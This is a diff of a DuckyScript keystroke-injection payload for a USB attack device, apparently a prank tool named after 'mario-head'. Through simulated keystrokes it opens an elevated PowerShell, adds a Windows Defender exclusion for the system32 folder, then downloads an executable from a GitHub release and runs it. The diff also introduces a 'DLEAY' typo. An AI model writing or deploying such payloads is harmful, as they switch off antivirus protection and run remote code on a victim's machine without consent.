@@ -10,12 +10,15 @@ REM startup delay
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell Start-Process powershell -Verb runAs
+STRING powershell
 CTRL-SHIFT ENTER
 DELAY 1500
 SHIFT TAB
 DELAY 500
 ENTER
 DELAY 1500
-STRING powershell -w h Add-MpPreference -ExclusionPath C:\Windows\system32;$down=New-Object System.Net.WebClient;$url='https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe';$file='mario_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DLEAY 1000
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe';$file='mario_dist.exe';$down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
